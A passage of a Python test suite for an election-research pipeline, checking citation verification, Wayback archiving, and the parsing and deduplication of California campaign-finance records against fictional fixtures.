    embedded in the path, so a blanket replace would rewrite the archived target too and
    name a snapshot that doesn't exist."""
    from vgpipe.archive import _https

    assert (_https("http://web.archive.org/web/2019/http://example.com/a")
            == "https://web.archive.org/web/2019/http://example.com/a")
    assert (_https("https://web.archive.org/web/2026/http://ocregister.com/x")
            == "https://web.archive.org/web/2026/http://ocregister.com/x")
    assert _https("http://example.com/not-a-snapshot") == "http://example.com/not-a-snapshot"


def test_review_app_sanitizes_stored_progress(tmp_path):
    """Progress comes from localStorage or a file someone hands you, so the app coerces it
    into a known shape: a null-prototype object (a stored `__proto__` would otherwise
    pollute every lookup), keys whitelisted to the source-id format, values reduced to the
    three fields it uses."""
    from vgpipe.report import render

    html_path, _ = render([Claim(question_id="q1", question="?", answer="a")],
                          tmp_path, title="T")
    html = html_path.read_text()

    assert "sanitizeState" in html
    assert "Object.create(null)" in html, "state must not inherit from Object.prototype"
    assert "SID_RE.test(k)" in html, "keys must be whitelisted to the source-id format"
    # both entry points go through it
    assert html.count("sanitizeState(JSON.parse(") == 2
    assert "e.target.value = ''" in html, "file input must reset so re-import works"


def test_status_reflects_what_build_will_render(tmp_path, monkeypatch, capsys):
    """`vg status` trusts the file for speed, so it must run the same offline checks build
    runs — otherwise it can report `verified` for a row the report downgrades."""
    import json

    from vgpipe import cli

    claims_dir = tmp_path / "claims"
    claims_dir.mkdir()
    (claims_dir / "q1.json").write_text(json.dumps({
        "question_id": "q1", "question": "?", "answer": "a",
        "sources": [{"url": "https://calmatters.org/a", "publisher": "CalMatters",
                     "author": "R", "source_type": "bylined_journalism",
                     "snippet": "a quote with no cached page behind it",
                     "verification": {"status": "verified"}}]}))

    monkeypatch.setattr("vgpipe.verify.load_cached", lambda root, url: None)
    cli.status(data=tmp_path)
    out = capsys.readouterr().out
    assert "human_review" in out, "a status the pipeline can't reproduce must not read as verified"
    assert "verified" not in out.replace("human_review", "")


def test_error_page_containing_the_snippet_does_not_verify(stub, tmp_path):
    """A citation must point at a page that actually served. Error pages can carry the
    snippet — a soft 404 echoing the query, a 'not found' page quoting the article title —
    and would otherwise render green."""
    stub["https://calmatters.org/gone"] = _page(
        url="https://calmatters.org/gone", status=404,
        text="Page not found. You searched for: she opposed the Harbor Levy Act")
    s = verify_source(src(url="https://calmatters.org/gone"), tmp_path, rules=RULES)
    assert s.verification.status == "fetch_failed"

    # 410 and 500 likewise
    for code in (410, 503):
        stub["https://calmatters.org/gone"] = _page(
            url="https://calmatters.org/gone", status=code, text=PAGE_TEXT)
        assert verify_source(src(url="https://calmatters.org/gone"), tmp_path,
                             rules=RULES).verification.status == "fetch_failed"

    # but 403 is the paywall path: the page exists, we just can't read it
    stub["https://ocregister.com/x"] = _page(
        url="https://ocregister.com/x", status=403, text="Subscribe to continue reading.")
    out = verify_source(src(url="https://ocregister.com/x", publisher="OC Register"),
                        tmp_path, rules=RULES)
    assert out.verification.status == "could_not_verify_paywall"


def test_not_found_is_not_badged_as_a_failure(tmp_path):
    """The header calls not_found deliberate, not failure. The badge must agree."""
    from vgpipe.report import render

    c = Claim(question_id="q1", question="?", answer="looked, found nothing",
              confidence="not_found")
    html = render([c], tmp_path, title="T")[0].read_text()
    assert 'class="b mut">not_found<' in html
    assert 'class="b bad">not_found<' not in html


def test_unchecked_corroboration_is_not_verified_or_failed():
    """None means check_corroboration() hasn't run. Reading it as verified is a false
    green on an adversarial claim; reading it as failure is a false alarm."""
    c = Claim(question_id="q1", question="?", answer="a", claim_type="adversarial",
              sources=[_verified(), _verified(url="https://sacbee.com/b",
                                              publisher="Sacramento Bee")])
    assert c.corroboration_ok is None
    assert c.status == "pending", "must not read as verified before corroboration runs"

    # Corroboration alone is not enough: an unjudged source is not a verified one. In testing
    # the verifier silently never ran and every claim rendered green.
    check_corroboration(c)
    assert c.status == "pending", "no verdict recorded yet"
    for s_ in c.sources:
        s_.verification.support = "supports"
    assert c.status == "verified"


def test_saved_snapshot_url_satisfies_the_model():
    """SPN can land on http://; the model requires https, so save() must normalize or
    vg archive raises when it assigns the result."""
    from vgpipe.archive import _https

    normalized = _https("http://web.archive.org/web/2026/https://ocregister.com/x")
    Source(url="https://ocregister.com/x", archive_url=normalized, publisher="P",
           author="A", source_type="bylined_journalism", snippet="a snippet here")


def test_completeness_check_never_reaches_a_researcher_prompt():
    """race.context is pasted verbatim into researcher prompts. A researcher told what it
    is looking for confirms that item instead of searching, and anything not on the list
    never surfaces — so known claims live in a section the loader keeps out of context."""
    from vgpipe.races import load

    r = load("example")
    assert "Doe settlement" in r.completeness_check
    assert "Doe settlement" not in r.context
    assert "parcel tax" not in r.context
    # the context keeps what helps find records, not what suggests conclusions
    assert "Avery Lind" in r.context and "appeals board" in r.context and "registrar" in r.context


def test_prompt_context_carries_no_uncited_factual_claims():
    """Context is unverified by construction — no snippet, no source, no `vg verify` — so a
    factual claim placed there is believed by every researcher and checked by none."""
    from vgpipe.races import load

    ctx = load("example").context
    for smuggled in ("58.3", "41.7", "Pike", "Marlowe", "re-registered"):
        assert smuggled not in ctx, f"unverified fact in researcher-facing context: {smuggled}"


def test_check_claim_gate_rejects_a_one_word_snippet(tmp_path, monkeypatch):
    """The prose rule ('5-10 distinctive words') was already in the agent definition and a
    one-word snippet still got written twice in testing. This gate makes it mechanical:
    non-zero exit, before the claim is ever handed on."""
    import json

    import typer

    from vgpipe import cli

    claim = {"question_id": "qtest", "question": "?", "answer": "a", "confidence": "direct",
             "sources": [{"url": "https://calmatters.org/a", "publisher": "CalMatters",
                          "author": "R", "source_type": "bylined_journalism",
                          "snippet": "Commission"}]}
    path = tmp_path / "qtest.json"
    path.write_text(json.dumps(claim))

    with pytest.raises(typer.Exit) as exc:
        cli.check_claim(path, data=tmp_path)
    assert exc.value.exit_code == 1


def test_new_candidate_retargets_the_question_set(tmp_path):
    """Separate run per candidate: each gets its own claims, retries and review progress.
    The question set is retargeted rather than leaving the researcher to infer who
    'the candidate' is."""
    import json

    from vgpipe import cli

    (tmp_path / "questions.json").write_text(json.dumps([
        {"id": "q1", "text": "What did Avery Lind say about housing?", "claim_type": "mechanical"}]))
    cli.new_candidate("ng", data=tmp_path)

    out = json.loads((tmp_path / "ng" / "questions.json").read_text())
    assert out[0]["text"] == "What did Jordan Ng say about housing?"
    assert out[0]["subject"] == "ng"
    assert (tmp_path / "ng" / "claims").is_dir()
    # the page cache is shared, not per candidate
    assert (tmp_path / "cache" / "pages").is_dir()
    assert not (tmp_path / "ng" / "cache").exists()


def test_new_candidate_starts_a_run_with_no_migration_pending(tmp_path):
    """A template carrying pending maps_from entries copied them into every new run. That run's
    researchers write straight onto the new ids, so the copied maps_from is a migration that
    never applied to it — and `vg remap --apply` shifted every claim. A new run
    has no earlier id space, so it gets neither a pending migration nor another run's history."""
    import json

    from vgpipe import cli

    (tmp_path / "questions.json").write_text(json.dumps([
        {"id": "q1", "text": "votes", "claim_type": "mechanical", "maps_from": "q2"},
        {"id": "q2", "text": "donations", "claim_type": "mechanical", "mapped_from": "q1"},
        {"id": "q3", "text": "donors", "claim_type": "mechanical", "maps_from": "q1",
         "mapped_from": "q3"}]))
    cli.new_candidate("ng", data=tmp_path)
    run = tmp_path / "ng"
    out = json.loads((run / "questions.json").read_text())
    assert [q["id"] for q in out] == ["q1", "q2", "q3"]
    assert not [q for q in out if "maps_from" in q or "mapped_from" in q], out

    for qid, answer in (("q1", "votes"), ("q2", "donations")):
        (run / "claims" / f"{qid}.json").write_text(json.dumps(
            {"question_id": qid, "question": qid, "answer": answer, "sources": []}))
    cli.remap(data=run, apply=True)
    assert _answers(run) == {"q1": "votes", "q2": "donations"}, "a new run's claims stay put"


def test_filing_citation_without_a_date_is_rejected():
    """A superseded filing verifies perfectly — same host, same institutional author,
    snippet genuinely present — so the only mechanical grip on recency is the filing's own
    date. Without it nobody, agent or human, can tell which form they are looking at."""
    from vgpipe.verify import missing_filing_date

    undated = src(url="https://www.fppc.ca.gov/documents/700.pdf", publisher="FPPC",
                  author="California FPPC", source_type="primary_document", date=None)
    assert missing_filing_date(undated)

    dated = src(url="https://www.fppc.ca.gov/documents/700.pdf", publisher="FPPC",
                author="California FPPC", source_type="primary_document", date="2025-04-01")
    assert not missing_filing_date(dated)

    # journalism isn't a filing series; a missing date there is untidy, not a defect
    article = src(url="https://calmatters.org/a", date=None)
    assert not missing_filing_date(article)


def test_superseded_is_a_verifier_verdict():
    """The wrong-document failure needs somewhere to live: it is judgment, not mechanics."""
    from vgpipe.models import Verification

    v = Verification(support="superseded", support_note="2025 Form 700 exists")
    assert v.support == "superseded"


def test_form700_search_parses_filings_newest_first(monkeypatch):
    """The FPPC portal is a JS app, so the pipeline queries the endpoint behind it. Getting
    the ordering right is the point: citing the newest filing is the whole reason this
    exists."""
    import json as _json

    import httpx

    from vgpipe import fppc

    payload = _json.dumps({"documents": [
        {"filingInfo": {"filedDate": "2025-03-03T00:00:00", "isAmendment": False},
         "filer": {"firstName": "Dana", "lastName": "Ko"},
         "filingPositions": [{"filingYear": 2024, "agency": "Controller"}],
         "indexID": "OLD"},
        {"filingInfo": {"filedDate": "2026-03-02T00:00:00", "isAmendment": False},
         "filer": {"firstName": "Dana", "lastName": "Ko"},
         "filingPositions": [{"filingYear": 2025, "agency": "Controller"}],
         "indexID": "NEW"},
    ]})

    def fake_post(url, **kw):
        return httpx.Response(200, json=payload, request=httpx.Request("POST", url))

    monkeypatch.setattr(fppc.httpx, "post", fake_post)
    filings = fppc.search("Dana", "Ko")
    assert [f.index_id for f in filings] == ["NEW", "OLD"]
    assert filings[0].newest_year == 2025
    assert filings[0].filed_date == "2026-03-02"


def test_curl_import_drops_credentials(tmp_path):
    """'Copy as cURL' is how these endpoints get found, and that paste contains the human's
    live session. It must never reach disk — and an endpoint that only works with it is a
    manual retrieval, not a pipeline capability."""
    import json as _json

    from vgpipe.access import parse_curl

    curl = (
        "curl --url 'https://example.gov/api/Search' "
        "-H 'accept: */*' -H 'content-type: application/json' "
        "-b 'SESSION=supersecret; cf_clearance=alsosecret' "
        "-H 'Cookie: more=secret' -H 'Authorization: Bearer tokensecret' "
        """--data-raw '{"q":"x"}'"""
    )
    res = parse_curl(curl)
    blob = _json.dumps(res)
    for secret in ("supersecret", "alsosecret", "more=secret", "tokensecret"):
        assert secret not in blob
    assert set(res["dropped_credentials"]) >= {"cookie", "authorization"}
    assert set(res["entry"]["recipes"][0]["headers"]) == {"accept", "content-type"}
    assert res["entry"]["recipes"][0]["method"] == "POST"


def test_recipe_refuses_to_run_with_credential_headers():
    """A recipe needing a cookie is describing a manual retrieval; running it would bake a
    human's session into the pipeline and misrepresent what it can do unattended."""
    from vgpipe.access import Recipe, run

    r = Recipe(id="bad", method="GET", url="https://example.gov/x",
               headers={"Cookie": "SESSION=x"})
    with pytest.raises(ValueError, match="credential headers"):
        run(r, {})


def test_registry_lookup_matches_subdomains(tmp_path):
    """A researcher hitting a document URL should find the entry recorded for its host."""
    from vgpipe.access import find

    entry = find("https://form700search.fppc.ca.gov/Home/GetDocument?indexId=abc")
    assert entry is not None
    assert entry.access == "api"
    assert entry.recipe("search-by-name") is not None
    assert "manual" in entry.limits.lower() or "does not" in entry.limits.lower()


# --- defects found by the first end-to-end smoke test -------------------------------


def test_a_claim_the_verifier_rejected_does_not_render_verified(tmp_path):
    """The smoke test's central finding: q6 showed `verified`, `corroboration_ok: true`,
    `15/1 usable` — with every one of its 15 sources judged unsupported by a fresh verifier.
    The pipeline stopped an agent certifying its own quote, then let a comprehensively
    failed claim render green anyway. That moves the fabrication from the quote to the
    argument; it doesn't prevent it."""
    c = Claim(question_id="q6", question="?", answer="a",
              sources=[_verified(), _verified(url="https://sacbee.com/b", publisher="Bee")])
    assert c.status == "pending"          # not judged yet
    for s in c.sources:
        s.verification.support = "topic_only"
    check_corroboration(c)
    assert c.status == "human_review"
    assert c.corroboration_ok is False
    assert "rejected by the verifier" in c.corroboration_note


def _cache_judged_page(root, url):
    """Cache `url` as fetched before anything is judged: a verdict with no page behind it reads
    stale, so a test about something else has to give its verdicts one."""
    from datetime import timedelta

    from vgpipe.fetch import cache_path

    cache_path(root, url).write_text(
        _page(url=url, final_url=url,
              fetched_at=datetime.now(UTC) - timedelta(hours=1)).model_dump_json())


def _stamp(root, url):
    """(page_fetched_at, extractor_version) of the copy cached at `url`: what a verdict stamped
    from it records. Tests only — `vg judge` stamps through `judgments.judged_copy()`, since the
    copy cached now need not be the one the verifier read."""
    from vgpipe.fetch import load_cached

    page = load_cached(root, url)
    return (str(page.fetched_at), page.extractor_version) if page is not None else ("", 0)


def test_judgments_survive_a_verify_run(tmp_path):
    """Verdicts cannot live in the claim file: verify reloads with stripping on, so a
    judgment written there is destroyed by the next run. The smoke test's orchestrator had
    to sequence every verify before every writeback by hand."""
    import json

    from vgpipe import judgments
    from vgpipe.models import strip_machine_fields

    s = src()
    _cache_judged_page(tmp_path, s.url)
    judgments.record(tmp_path, "q6", s.sid, "superseded", "2025 filing exists")

    # the claim file goes through the strip that would have destroyed an inline verdict
    raw = json.loads(Claim(question_id="q6", question="?", answer="a",
                           sources=[s]).model_dump_json())
    reloaded = Claim.model_validate(strip_machine_fields(raw))
    assert reloaded.sources[0].verification.support == "unreviewed"

    judgments.apply_to(reloaded, tmp_path, cache_root=tmp_path)
    assert reloaded.sources[0].verification.support == "superseded"
    assert reloaded.sources[0].verification.support_note == "2025 filing exists"


def test_archiving_an_archive_url_is_a_no_op():
    """`vg archive` wrapped an already-Wayback URL into
    web.archive.org/save/https://web.archive.org/web/…, which the model then rejected — and
    `vg build` died on the entire run, not the one row."""
    from vgpipe.archive import is_snapshot, save

    snap = "https://web.archive.org/web/2026/https://ocregister.com/x"
    assert is_snapshot(snap)
    assert save(snap) == (snap, None)
    assert not is_snapshot("https://calmatters.org/a")


def test_short_identifiers_are_allowed_but_line_breaks_are_not(stub, tmp_path):
    """The word-count rule rejected the parcel number 000-111-222-000 — unique on the page
    and exactly what a human would Cmd-F — and the retry came back with a span crossing a
    line break, which our extracted text matches and a human's find bar does not. The rule
    optimized against the thing it protects."""
    stub["https://calmatters.org/a"] = _page(text="APN 000-111-222-000\nCITY Millbrook here")

    ok = verify_source(src(snippet="000-111-222-000"), tmp_path, rules=RULES)
    assert ok.verification.status == "verified"

    too_common = verify_source(src(snippet="APN"), tmp_path, rules=RULES)
    assert too_common.verification.status == "snippet_too_short"

    spanning = verify_source(src(snippet="000-111-222-000\nCITY"), tmp_path, rules=RULES)
    assert spanning.verification.status == "human_review"
    assert "line break" in spanning.verification.reason


# --- CAL-ACCESS bulk export ---------------------------------------------------------


def _fake_export(tmp_path):
    """A miniature dbwebexport.zip, including the dirt real CAL-ACCESS TSVs contain."""
    import zipfile

    root = tmp_path
    (root / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    zp = root / "cache" / "calaccess" / "dbwebexport.zip"

    filers = "FILER_ID\tNAML\tNAMF\n1234567\tKo for Controller 2026\t\n7654321\tSmith\tJane\n"
    # a stray double quote and a short row: both occur in the real export
    # Mirrors the real export's schema, verified against it: RCPT_CD has no FILER_ID and
    # uses RCPT_DATE; S496_CD is amounts only, with the candidate on the cover record. Dates
    # are the export's own "M/D/YYYY 12:00:00 AM" text: ISO dates here once hid a string
    # comparison that sorted 10/14/2025 before 2025-01-01.
    # An amendment restates the WHOLE filing: amend 1 repeats IDT1 and IDT2, so each counts
    # once at the latest, and it drops IDT4, so that gift was withdrawn and must not count.
    receipts = (
        'FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tCTRIB_NAML\tCTRIB_NAMF\tCTRIB_EMP'
        '\tCTRIB_OCC\tRCPT_DATE\tAMOUNT\tFORM_TYPE\n'
        '2938471\t0\tIDT1\t1\tBig Donor "Bob"\tRobert\tAcme Corp\tExecutive'
        '\t4/1/2026 12:00:00 AM\t9900\tA\n'
        '2938471\t0\tIDT2\t2\tSmall Donor\tSue\tSelf\tTeacher\t5/2/2026 12:00:00 AM\t250\tA\n'
        '2938471\t0\tIDT4\t3\tWithdrawn Donor\tRay\tSelf\tRetired'
        '\t4/15/2026 12:00:00 AM\t5000\tA\n'
        '2938471\t1\tIDT1\t1\tBig Donor "Bob"\tRobert\tAcme Corp\tExecutive'
        '\t4/1/2026 12:00:00 AM\t9900\tA\n'
        '2938471\t1\tIDT2\t2\tSmall Donor\tSue\tSelf\tTeacher\t5/2/2026 12:00:00 AM\t250\tA\n'
        '2938472\t0\tIDT3\t1\tShort Row\tPat\n'
    )
    # FILER_FILINGS_CD carries one row per filing SEQUENCE: filing 2938471 was amended, so it
    # appears twice. Joining to the raw table multiplies every contribution by that count.
    filings = ('FILER_ID\tFILING_ID\tFORM_ID\tFILING_DATE\n'
               '1234567\t2938471\tF460\t4/30/2026 12:00:00 AM\n'
               '1234567\t2938471\tF460\t5/15/2026 12:00:00 AM\n'
               '1234567\t2938472\tF460\t5/30/2026 12:00:00 AM\n')
    ies = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tAMOUNT\tEXP_DATE\tEXPN_DSCR\n'
           '3000001\t0\tIE1\t1\t50000\t9/1/2026 12:00:00 AM\tmailers\n'
           '3000002\t0\tIE2\t1\t12000\t9/15/2026 12:00:00 AM\tdigital ads\n')
    covers = ('FILING_ID\tAMEND_ID\tFILER_ID\tFILER_NAML\tCAND_NAML\tCAND_NAMF\tSUP_OPP_CD'
              '\tFORM_TYPE\n'
              '3000001\t0\t9999999\tCommittee for Something\tKo\tDana\tS\tF496\n'
              '3000002\t0\t9999998\tOther Committee\tKo\tDana\tO\tF496\n')

    with zipfile.ZipFile(zp, "w") as zf:
        zf.writestr("CalAccess/DATA/FILERNAME_CD.TSV", filers)
        zf.writestr("CalAccess/DATA/RCPT_CD.TSV", receipts)
        zf.writestr("CalAccess/DATA/S496_CD.TSV", ies)
        zf.writestr("CalAccess/DATA/FILER_FILINGS_CD.TSV", filings)
        zf.writestr("CalAccess/DATA/CVR_CAMPAIGN_DISCLOSURE_CD.TSV", covers)
    return root


def test_calaccess_build_and_query(tmp_path):
    """CAL-ACCESS is the only reachable route to donor data — both UIs over it are closed to
    programmatic clients — so this path has to work on the export's real messiness."""
    from vgpipe import calaccess

    root = _fake_export(tmp_path)
    calaccess.build(root)

    filers = calaccess.find_filers(root, "Ko for Controller")
    assert filers and filers[0]["filer_id"] == "1234567"

    got = calaccess.contributions_to(root, "1234567", top=10)
    assert [c.amount for c in got][:2] == [9900.0, 250.0]      # ordered by size
    assert got[0].contributor == "Robert Big Donor \"Bob\""     # a stray quote must not eat the file
    assert any(c.contributor.startswith("Pat") for c in got)   # short row padded, not dropped


def test_calaccess_rows_carry_a_citable_url(tmp_path):
    """A row in a local TSV is not a citation: no URL to open, nothing to Cmd-F. Every result
    carries the filing's own page so the human cites that instead."""
    from vgpipe import calaccess

    root = _fake_export(tmp_path)
    calaccess.build(root)

    c = calaccess.contributions_to(root, "1234567", top=1)[0]
    assert c.cite_url.startswith("https://cal-access.sos.ca.gov/")
    assert c.filing_id in c.cite_url

    ies = calaccess.independent_expenditures(root, "Ko")
    assert [i["stance"] for i in ies] == ["support", "oppose"]
    assert all(i["cite_url"].startswith("https://cal-access.sos.ca.gov/") for i in ies)


def test_calaccess_build_without_the_export_says_how_to_get_it(tmp_path):
    from vgpipe import calaccess

    with pytest.raises(FileNotFoundError, match="dbwebexport.zip"):
        calaccess.build(tmp_path)


def test_candidate_matching_is_exact_by_default(tmp_path):
    """A substring match on a two-letter surname pulled in committees supporting a different
    candidate whose surname contains it, and reported that spending as the candidate's largest
    backer — a fabricated headline finding, assembled from real rows by a sloppy query. Real
    data, real amounts, wrong person: the pipeline's snippet checks would never have caught it."""
    import zipfile

    from vgpipe import calaccess

    root = tmp_path
    (root / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    ies = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tAMOUNT\tEXP_DATE\tEXPN_DSCR\n'
           '1\t0\tIE1\t1\t3200000\t4/15/2026 12:00:00 AM\tads\n'
           '2\t0\tIE2\t1\t95000\t5/12/2006 12:00:00 AM\tmailers\n')
    covers = ('FILING_ID\tAMEND_ID\tFILER_ID\tFILER_NAML\tCAND_NAML\tCAND_NAMF\tSUP_OPP_CD'
              '\tFORM_TYPE\n'
              '1\t0\t111\tCitizens for Better Schools\tCasey Kowalski\tCasey\tS\tF496\n'
              '2\t0\t222\tEducators Forward\tKo\tDana\tS\tF496\n')
    with zipfile.ZipFile(root / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/S496_CD.TSV", ies)
        zf.writestr("CalAccess/DATA/CVR_CAMPAIGN_DISCLOSURE_CD.TSV", covers)
    calaccess.build(root)

    exact = calaccess.independent_expenditures(root, "Ko")
    assert [r["CAND_NAMF"] for r in exact] == ["Dana"]
    assert all(float(r["AMOUNT"]) == 95000 for r in exact)

    loose = calaccess.independent_expenditures(root, "Ko", loose=True)
    assert len(loose) == 2, "loose is opt-in and does sweep in the wrong candidate"

    assert calaccess.independent_expenditures(root, "Ko", first="Morgan") == []


def test_archive_credentials_come_only_from_the_environment(monkeypatch):
    """Save Page Now rate-limits anonymous clients hard — a full run left 58 of ~150 URLs
    unarchived. Keys raise the quota, and they live in the environment: never in the repo,
    never in a file this code reads, never in a claim file."""
    from vgpipe import archive

    monkeypatch.delenv(archive.ACCESS_KEY_ENV, raising=False)
    monkeypatch.delenv(archive.SECRET_KEY_ENV, raising=False)
    assert archive.credentials() is None
    assert archive.auth_header() == {}

    # a half-configured pair must not produce a broken Authorization header
    monkeypatch.setenv(archive.ACCESS_KEY_ENV, "abc")
    assert archive.credentials() is None

    monkeypatch.setenv(archive.SECRET_KEY_ENV, "xyz")
    assert archive.credentials() == ("abc", "xyz")
    assert archive.auth_header() == {"Authorization": "LOW abc:xyz"}
    assert archive.have_credentials()


def test_authenticated_archiving_uses_the_spn_api(monkeypatch):
    """Authenticated SPN is a POST returning a job to poll, not the redirect-following GET."""
    import httpx

    from vgpipe import archive

    monkeypatch.setenv(archive.ACCESS_KEY_ENV, "abc")
    monkeypatch.setenv(archive.SECRET_KEY_ENV, "xyz")
    calls = {}

    def fake_post(url, **kw):
        calls["post"] = (url, kw["headers"].get("Authorization"))
        return httpx.Response(200, json={"job_id": "job-1"},
                              request=httpx.Request("POST", url))

    def fake_get(url, **kw):
        return httpx.Response(200, json={"status": "success", "timestamp": "20260822000000",
                                         "original_url": "https://calmatters.org/a"},
                              request=httpx.Request("GET", url))

    monkeypatch.setattr(archive.httpx, "post", fake_post)
    monkeypatch.setattr(archive.httpx, "get", fake_get)
    monkeypatch.setattr(archive, "existing_snapshot", lambda url, timeout=20.0: None)

    got, err = archive.save("https://calmatters.org/a")
    assert err is None
    assert got == "https://web.archive.org/web/20260822000000/https://calmatters.org/a"
    assert calls["post"][0] == archive.SAVE_API
    assert calls["post"][1] == "LOW abc:xyz"


def test_question_ids_sort_numerically():
    """A 31-question run rendered q1, q10, q11 … q2, q20 in the review app, which makes it
    hard to see what is missing. Ids are number-then-optional-letter, so compare the number
    as a number."""
    from vgpipe.cli import qid_sort_key

    ids = ["q10", "q2", "q1", "q31", "q2b", "q2a", "q9", "q20"]
    assert sorted(ids, key=qid_sort_key) == [
        "q1", "q2", "q2a", "q2b", "q9", "q10", "q20", "q31"]
    # an id that doesn't fit the shape still sorts deterministically, at the end
    assert sorted(["q2", "weird"], key=qid_sort_key) == ["q2", "weird"]


def test_calaccess_citable_snapshot_prefers_the_official_page(monkeypatch):
    """cal-access pages are bot-protected, so a direct citation fails verification and pushes
    researchers onto third-party mirrors. A Wayback snapshot of the official page IS
    fetchable, so it can carry the record instead."""
    from vgpipe import calaccess

    snap = "https://web.archive.org/web/20230117090000/https://cal-access.sos.ca.gov/x"
    monkeypatch.setattr("vgpipe.archive.existing_snapshot", lambda url, timeout=20.0: snap)
    # With no root to fetch with, it returns the snapshot but still bounds what it supports.
    got, note = calaccess.citable_snapshot("https://cal-access.sos.ca.gov/x")
    assert got == snap
    assert "per-donor" in note, "must not imply itemization is citable from here"

    monkeypatch.setattr("vgpipe.archive.existing_snapshot", lambda url, timeout=20.0: None)
    got, note = calaccess.citable_snapshot("https://cal-access.sos.ca.gov/x")
    assert got is None
    assert "secondary_host_ack" in note, "must point at the honest fallback, not a silent one"


def test_citable_snapshot_refuses_the_wrong_cycle(monkeypatch, tmp_path):
    """Finding *a* snapshot is not enough. Asked about a 2026 committee, the first version of
    this returned a 2023 landing page — the wrong-document trap `superseded` exists to catch,
    reintroduced. The note has to bound what the snapshot supports."""
    from datetime import UTC, datetime

    from vgpipe import calaccess
    from vgpipe.models import PageCache

    snap = ("https://web.archive.org/web/20230117090000/"
            "https://cal-access.sos.ca.gov/Campaign/Committees/Detail.aspx?id=9990001")
    monkeypatch.setattr("vgpipe.archive.existing_snapshot", lambda url, timeout=20.0: snap)
    monkeypatch.setattr("vgpipe.fetch.fetch", lambda url, root, **kw: PageCache(
        url=url, final_url=url, status=200, content_type="text/html",
        text="Election Cycle: 2023 through 2024 Historical  CURRENT STATUS ACTIVE",
        fetched_at=datetime.now(UTC)))

    got, note = calaccess.citable_snapshot(
        "https://cal-access.sos.ca.gov/x", root=tmp_path, expect_year="2026")
    assert got == snap
    assert note.startswith("WRONG CYCLE")
    assert "Do not cite this" in note


def test_citable_snapshot_says_totals_are_not_itemization(monkeypatch, tmp_path):
    """The pages carry period totals, not per-donor rows. A researcher citing one for an
    individual donor's amount would have a real official page that doesn't say it."""
    from datetime import UTC, datetime

    from vgpipe import calaccess
    from vgpipe.models import PageCache

    snap = "https://web.archive.org/web/20251118100000/https://cal-access.sos.ca.gov/x"
    monkeypatch.setattr("vgpipe.archive.existing_snapshot", lambda url, timeout=20.0: snap)
    monkeypatch.setattr("vgpipe.fetch.fetch", lambda url, root, **kw: PageCache(
        url=url, final_url=url, status=200, content_type="text/html",
        text=("Election Cycle: 2025 through 2026 Historical "
              "CONTRIBUTIONS FROM THIS PERIOD | $456,789.01"),
        fetched_at=datetime.now(UTC)))

    got, note = calaccess.citable_snapshot(
        "https://cal-access.sos.ca.gov/x", root=tmp_path, expect_year="2026")
    assert got == snap
    assert "per-donor" in note and "not" in note


def test_citable_snapshot_does_not_describe_a_snapshot_it_could_not_read(monkeypatch, tmp_path):
    """An empty body has no "$" in it, so a failed fetch used to be reported as a landing page
    with no dollar figures — a description of a page nobody saw."""
    from vgpipe import calaccess

    snap = "https://web.archive.org/web/20251118100000/https://cal-access.sos.ca.gov/x"
    monkeypatch.setattr("vgpipe.archive.existing_snapshot", lambda url, timeout=20.0: snap)
    for page, why in [
        (dict(status=0, text="", error="ConnectError: connection reset"), "ConnectError"),
        # Wayback's own error page has text and no "$" — it is not a landing page either.
        (dict(status=503, text="This snapshot is temporarily unavailable."), "HTTP 503"),
    ]:
        monkeypatch.setattr("vgpipe.fetch.fetch", lambda url, root, page=page, **kw: _page(
            url=url, **page))
        got, note = calaccess.citable_snapshot("https://cal-access.sos.ca.gov/x", root=tmp_path)
        assert got == snap
        assert "could not be read" in note and why in note
        assert "landing page" not in note
        # `vg calaccess cite` shows it red, as the old "no dollar figures" note was
        assert calaccess.unusable(note)

    # and every other note keeps the colour it had
    assert calaccess.unusable("WRONG CYCLE: captured 2023-01, covers 2021 through 2022")
    assert calaccess.unusable("captured 2025-11; this page carries no dollar figures at all")
    assert not calaccess.unusable("captured 2025-11. Committee pages carry period TOTALS")


def test_contributions_count_each_gift_once(tmp_path):
    """The export restates every transaction in each amendment, and FILER_FILINGS_CD lists one
    row per filing sequence. Unguarded, those two multiply: a single contribution came out
    twelve times over, and a dozen donors landed on one identical inflated total. Real rows,
    real amounts, fabricated sums — and no snippet check can catch it, because there is no
    page to read."""
    from vgpipe import calaccess

    root = _fake_export(tmp_path)
    calaccess.build(root)

    got = calaccess.contributions_to(root, "1234567", top=20)
    bob = [c for c in got if "Bob" in c.contributor]
    assert len(bob) == 1, f"the amended transaction was counted {len(bob)} times"
    assert bob[0].amount == 9900.0
    assert sum(c.amount for c in got) == 9900.0 + 250.0


def test_a_transaction_a_later_amendment_dropped_is_not_counted(tmp_path):
    """An amendment restates the whole filing, so a transaction missing from the latest
    amendment was withdrawn. Keying "latest" per (FILING_ID, TRAN_ID) kept it alive from the
    older amendment — 387,606 receipt rows in the real export, across 4,722 filings."""
    from vgpipe import calaccess, queries

    root = _fake_export(tmp_path)
    calaccess.build(root)

    got = calaccess.contributions_to(root, "1234567", top=20)
    assert not [c for c in got if "Withdrawn" in c.contributor], (
        "a gift the latest amendment dropped was still listed")
    ray = queries.run("calaccess.contributor_total",
                      {"filer_id": "1234567", "contributor": "Withdrawn Donor",
                       "contributor_first": "Ray"}, root)
    assert ray.value is None and not ray.found, f"a withdrawn gift was totalled: {ray.value}"


def _filing_9990002(tmp_path, *, cover_amend_ids=True):
    """A filing as the real export carries it. Amendment 1 zeroes EDT14 under a new
    TRAN_ID and amendment 2 re-reports the same $2,750 as PDT9; amendments 0 and 1 support
    Dana Ko, and amendment 2 re-files the whole thing as OPPOSING Robin Delacroix."""
    import zipfile

    (tmp_path / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    ies = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tAMOUNT\tEXP_DATE\tEXPN_DSCR\n'
           '9990002\t0\tEDT14\t1\t2750\t5/12/2006 12:00:00 AM\tmailer\n'
           '9990002\t1\tPDT3\t1\t0\t5/12/2006 12:00:00 AM\tmailer\n'
           '9990002\t2\tPDT9\t1\t2750\t5/12/2006 12:00:00 AM\tmailer\n')
